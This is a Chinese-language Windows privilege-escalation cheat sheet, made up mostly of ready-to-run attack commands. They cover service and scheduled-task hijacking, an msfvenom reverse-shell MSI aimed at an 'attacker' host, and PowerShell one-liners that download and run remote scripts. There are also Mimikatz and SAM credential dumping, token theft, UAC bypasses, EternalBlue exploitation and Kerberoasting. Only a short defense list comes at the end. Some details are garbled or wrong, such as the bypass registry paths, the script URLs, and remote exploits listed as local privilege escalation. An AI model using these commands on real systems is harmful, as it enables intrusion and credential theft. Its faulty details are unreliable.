# Windows提权技术

Windows提权是从普通用户权限提升到管理员或SYSTEM权限的过程。本文档涵盖Windows系统常见的提权方法和利用技术。

## 1 提权前信息收集

### 1.1 系统基本信息

```cmd
# 查看当前用户和权限
whoami
whoami /priv
whoami /all

# 查看系统信息
systeminfo
hostname
echo %username%

# 查看操作系统版本
ver
wmic os get caption,version,buildnumber
```

### 1.2 补丁情况分析

```cmd
# 列出已安装补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 导出补丁信息
wmic qfe list full /format:csv > patches.csv

# 查看是否有特定补丁
wmic qfe get HotFixID | findstr "KBxxxx"

# 使用PowerUp检查补丁
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
```

### 1.3 服务和进程分析

```cmd
# 查看运行的服务
sc query
sc query state= all
wmic service list brief

# 查看可修改的服务
powershell -Command "Get-Service | Where-Object {$_.Status -eq 'Running' -and $_.StartType -eq 'Manual'}"
accesschk.exe -uwcqv "Authenticated Users" *

# 查看进程
tasklist /v
wmic process list brief
wmic process get processid,name,commandline

# 查看以高权限运行的服务
wmic process where "name='svchost.exe'" get processid,parentprocessid,commandline
```

## 2 服务配置不当提权

### 2.1 服务权限配置不当

```cmd
# 使用accesschk检查服务权限
accesschk.exe -uwcqv "Users" *  # Users可写的服务
accesschk.exe -uwcqv "Everyone" *  # 所有人均可修改
accesschk.exe -uwcqv "NT AUTHORITY\INTERACTIVE" *  # 交互式用户

# 检查服务关联的可执行文件
sc qc servicename
icacls.exe "C:\path\to\service.exe"

# 修改服务配置指向恶意程序
sc config servicename binpath= "C:\windows\temp\malware.exe"
net stop servicename
net start servicename
```

### 2.2 注册表服务配置

```cmd
# 检查AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
# 如果为1，则可以使用msi文件以SYSTEM权限安装

# 利用AlwaysInstallElevated
msfvenom -p windows/exec CMD="C:\windows\temp\malware.exe" -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

### 2.3 DLL劫持

```cmd
# 检查服务依赖的DLL
sc qc servicename
# 查看服务binpath调用的模块

# 常用DLL劫持位置
# C:\Windows\System32\
# C:\Windows\
# 服务工作目录

# 检查可写的DLL位置
accesschk.exe -w "Users" C:\Windows\System32\*.dll
```

## 3 注册表提权

### 3.1 AlwaysInstallElevated利用

```powershell
# 检查注册表键值
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# 生成恶意MSI包
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi

# 以SYSTEM权限执行
msiexec /quiet /qn /i shell.msi
```

### 3.2 Token劫持

```powershell
# 查看当前进程token
powershell -Command "Get-Process | Select-Object Name, Id, @{N='Owner';E={(Get-WmiObject Win32_Process -Filter "ProcessId=$PID").GetOwner().User}}"

# 使用incognito窃取token
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```

## 4 密码凭证提取

### 4.1 内存凭证提取

```powershell
# 使用Mimikatz提取明文密码
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::credentials

# PowerShell版
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

# 使用SharpKatz (C#版本)
SharpKatz.exe --Command logonpasswords
```

### 4.2 SAM和LSASS导出

```cmd
# 绕过LSASS保护
# 方法1: 添加注册表使明文保存
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# 方法2: 离线读取SAM
reg save hklm\sam C:\windows\temp\sam
reg save hklm\system C:\windows\temp\system
reg save hklm\security C:\windows\temp\security

# 方法3: 使用vssadmin卷影复制
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM C:\windows\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\windows\temp\SYSTEM
```

### 4.3 密码搜索

```cmd
# 在文件系统搜索密码
findstr /si /p password *.xml *.ini *.txt *.cfg *.conf *.config
findstr /si /p pass *.xml *.ini *.txt *.cfg *.conf *.config
dir /s /b *pass*.txt *pass*.xml *pass*.ini *pass*.cfg

# 注册表中的密码
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# 回收站和临时目录
dir /s /b C:\*.txt | findstr "password"
```

### 4.4 VNC/远程工具密码

```powershell
# 查找VNC保存的密码
# RealVNC
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimikatz.ps1')"
Invoke-Mimikatz -Command "privilege::debug misc::memssp"

# TightVNC
# 密码存储在注册表
reg query HKCU\Software\TightVNC\Server /v Password

# TeamViewer
# 密码存储在注册表(加密)
reg query HKLM\Software\TeamViewer /v Password
```

## 5 内核漏洞提权

### 5.1 常用提权漏洞

| 漏洞编号 | 影响系统 | 描述 |
|----------|----------|------|
| MS08-067 | Windows XP/2003 | Server服务缓冲区溢出 |
| MS17-010 | Win 7/2008/2012 | SMB永恒之蓝 |
| CVE-2019-0708 | Win 7/2008/XP | RDP BlueKeep |
| CVE-2021-34527 | Win 7/10/11 | Print Spooler漏洞 |
| CVE-2023-21768 | Win 10/11/Server | Windows Ancillary Function Driver |

### 5.2 漏洞检测工具

```powershell
# Winpeas
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEAS.ps1')"

# Sherlock (PowerShell)
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')"

# Watson (自动查找可用漏洞)
SharpWatson.exe

# 检测SMB漏洞
nmap --script smb-vuln-ms17-010.nse -p445 target
```

### 5.3 漏洞利用

```cmd
# MS17-010 (永恒之蓝)
# 使用Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set rhost target_ip
set payload windows/x64/meterpreter/bind_tcp
run

# 使用Eternablue脚本
python eternalblue_exploit.py target_ip shellcode.bin

# CVE-2019-0708 (BlueKeep)
# Metasploit模块
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set rhost target_ip
```

## 6 计划任务和服务提权

### 6.1 计划任务分析

```cmd
# 查看计划任务
schtasks /query /fo LIST /v
schtasks /query /tn "TaskName" /fo LIST /v

# 使用PowerShell查看
Get-ScheduledTask | Select-Object TaskName, State, Author
Get-ScheduledTaskInfo -TaskName "TaskName" -Verbose

# 检查计划任务权限
icacls C:\Windows\System32\tasks
accesschk.exe -uwcqv "Users" "C:\Windows\Tasks"
```

### 6.2 利用计划任务

```powershell
# 创建计划任务执行恶意程序
schtasks /create /tn "SystemUpdate" /tr "C:\windows\temp\malware.exe" /sc DAILY /st 02:00 /ru SYSTEM /f

# 修改现有计划任务
schtasks /change /tn "ExistingTask" /tr "C:\windows\temp\malware.exe"

# 立即执行
schtasks /run /tn "TaskName"
```

### 6.3 服务枚举与利用

```cmd
# 检查服务状态
sc queryex type= service state= all

# 检查服务权限
accesschk.exe -uwcqv "Users" *

# 创建服务提权
sc create "MaliciousService" binpath= "C:\windows\temp\malware.exe" displayname= "Windows Update" obj= "LocalSystem" start= auto
net start "MaliciousService"

# 修改服务路径
sc config "ServiceName" binpath= "C:\windows\temp\malware.exe"
```

## 7 Potato系列提权

### 7.1 RottenPotato

```powershell
# 使用Rotten Potato获取SYSTEM token
use incognito
execute -cH -f RottenPotato.exe
# 或在meterpreter中
use sniffer
```

### 7.2 JuicyPotato

```cmd
# 下载JuicyPotato
# https://github.com/ohpe/juicy-potato/releases

# 利用
JuicyPotato.exe -l 1337 -p C:\windows\temp\malware.exe -t * -c {CLSID}

# 常用CLSID (System)
# Windows 7/2008:
# {8BC3F05E-D86B-11D0-A075-00C04FB68820}

# Windows 10/2016/2019:
# {8BC3F05E-D86B-11D0-A075-00C04FB68820}
# 或使用-W 1参数自动搜索

# 指定服务账户
JuicyPotato.exe -l 1337 -p C:\windows\temp\malware.exe -t u -c {CLSID}
```

### 7.3 SweetPotato

```powershell
# WebDelivery方式
SweetPotato.exe -w "C:\windows\temp\malware.exe"
```

## 8 令牌窃取

### 8.1 Metasploit中的令牌窃取

```meterpreter
# 加载incognito模块
use incognito

# 列出可用令牌
list_tokens -u
list_tokens -g

# 窃取用户令牌
impersonate_token "DOMAIN\\Username"

# 窃取SYSTEM令牌
impersonate_token "NT AUTHORITY\\SYSTEM"

# 返回真实shell
rev2self
```

### 8.2 PowerShell令牌窃取

```powershell
# 使用PowerShell Empire的token戚取
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-TokenManipulation.ps1')"
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

## 9 绕过UAC提权

### 9.1 UAC检查

```cmd
# 检查当前用户是否管理员
net localgroup Administrators

# 检查UAC状态
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# 检查是否已提升权限
whoami /all | findstr /i "admin"
```

### 9.2 UAC绕过方法

```powershell
# 1. FodHelper (Windows 10/2016)
# 利用注册表键值
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "C:\windows\temp\malware.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f
fodhelper.exe

# 2. sdclt (Windows 10)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /d "C:\windows\temp\malware.exe" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /v "Path" /d "C:\windows\system32" /f
sdclt.exe

# 3. eventvwr
reg add HKCU\Software\Microsoft\Windows\currentversion\app paths\eventvwr.exe /ve /d "C:\windows\temp\malware.exe" /f
reg add HKCU\Software\Microsoft\Windows\currentversion\app paths\eventvwr.exe /v "Path" /d "C:\windows\system32" /f
eventvwr.exe

# 4. Metasploit UAC绕过模块
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_sdclt
```

## 10 域环境提权

### 10.1 域用户到域管理员

```powershell
# 使用PowerSploit
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')"

# 使用BloodHound分析
# 在域主机上运行SharpHound收集数据
SharpHound.exe -c all
# 将结果导入BloodHound分析

# 查找域管理员登录的机器
Get-NetLoggedon -ComputerName <ComputerName>
```

### 10.2 Kerberoasting

```powershell
# 请求ST
Add-Type-assemblyname System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.contoso.com:1433"

# 使用Mimikatz导出
kerberos::list /export

# 使用Rubeus破解
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 10.3 AS-REP Roasting

```powershell
# PowerView查找可Roast的用户
Get-DomainUser -PreauthNotRequired

# 使用Rubeus
Rubeus.exe asreproast /outfile:hashes.txt

# 使用hashcat破解
hashcat -m 18200 hashes.txt wordlist.txt
```

## 11 常用提权工具

| 工具 | 功能 | 用法 |
|------|------|------|
| WinPEAS | 自动枚举可提权点 | `winPEASany.exe` |
| PrivescCheck | PowerShell提权枚举 | `powershell -ExecutionPolicy Bypass -Command .\PrivescCheck.ps1` |
| Seatbelt | 系统安全检查 | `Seatbelt.exe -group=system` |
| PowerUp | 常见配置错误检查 | `Invoke-AllChecks` |
| Sherlock | 漏洞检测 | `Find-AllVulns` |
| Mimikatz | 凭证提取 | `sekurlsa::logonpasswords` |
| JuicyPotato | Token提权 | `JuicyPotato.exe -l 1337 -p malware.exe -t *` |

## 12 防御措施

```powershell
# 1. 最小权限原则
#    - 不给普通用户管理员权限
#    - 限制服务账户权限

# 2. 禁用LM认证
#    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d 1 /f

# 3. 开启Windows Defender
#    防止恶意程序执行

# 4. 限制WDigest认证
#    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

# 5. 禁用SMBv1
#    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 6. 定期打补丁
#    使用WSUS或SCCM管理更新

# 7. 启用EPA (Extended Protection for Authentication)
#    防止中间人攻击

# 8. 监控
#    - Sysmon日志
#    - Windows Event Log
#    - 敏感操作审计
```

## 13 参考资源

- PayloadsAllTheThings Windows提权: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- Priv2Admin: https://github.com/antonioCoco/Priv2Admin
- Windows提权漏洞库: https://msguide.ru/
- BloodHound: https://github.com/BloodHoundAD/BloodHound
